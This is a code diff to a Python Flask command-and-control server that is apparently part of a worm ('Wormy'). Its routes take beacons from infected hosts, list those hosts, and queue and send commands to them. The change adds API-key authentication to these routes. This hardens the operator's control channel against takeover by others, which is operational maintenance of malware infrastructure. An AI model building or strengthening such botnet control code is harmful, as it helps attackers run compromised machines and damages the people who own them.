@@ -55,34 +55,55 @@ class C2Server:
     def _setup_routes(self):
         """Setup Flask routes"""
 
+        # FIX: Generate API key for authentication
+        import secrets
+        self.api_key = os.getenv("WORMY_C2_API_KEY", secrets.token_hex(32))
+
+        def require_api_key(f):
+            """Decorator to require API key authentication"""
+            from functools import wraps
+
+            @wraps(f)
+            def decorated(*args, **kwargs):
+                key = request.headers.get("X-API-Key") or request.args.get("api_key")
+                if key != self.api_key:
+                    return jsonify({"error": "Unauthorized"}), 401
+                return f(*args, **kwargs)
+            return decorated
+
         @self.app.route("/")
         def dashboard():
             """Main dashboard"""
             return self.get_dashboard_html()
 
         @self.app.route("/api/beacon", methods=["POST"])
+        @require_api_key
         def receive_beacon():
             """Receive beacon from infected host"""
             data = request.json
             return jsonify(self.process_beacon(data))
 
         @self.app.route("/api/command/<host_id>", methods=["GET"])
+        @require_api_key
         def get_command(host_id):
             """Get pending command for host"""
             command = self.get_pending_command(host_id)
             return jsonify({"command": command})
 
         @self.app.route("/api/stats", methods=["GET"])
+        @require_api_key
         def get_stats():
             """Get server statistics"""
             return jsonify(self.get_statistics())
 
         @self.app.route("/api/hosts", methods=["GET"])
+        @require_api_key
         def get_hosts():
             """Get all infected hosts"""
             return jsonify(self.get_all_hosts())
 
         @self.app.route("/api/send_command", methods=["POST"])
+        @require_api_key
         def send_command():
             """Send command to host"""
             data = request.json
